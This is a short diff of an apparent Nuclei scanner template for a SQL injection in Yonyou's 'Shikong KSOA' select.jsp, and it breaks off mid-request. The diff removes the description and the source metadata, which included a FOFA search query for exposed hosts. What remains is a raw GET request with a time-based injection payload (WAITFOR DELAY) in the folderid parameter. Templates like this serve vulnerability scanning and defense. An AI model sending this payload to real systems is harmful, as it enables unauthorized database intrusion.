@@ -3,12 +3,8 @@ info:
   name: 用友时空KSOA select存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cq5e98zdmo0qfmqz'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cq5e98zdmo0qfmqz
-    fofa: app="用友-时空KSOA"
 http:
 - raw:
   - 'GET /kmf/select.jsp?folderid=%27%3bWAITFOR+DELAY+%270%3a0%3a5%27-- HTTP/1.1
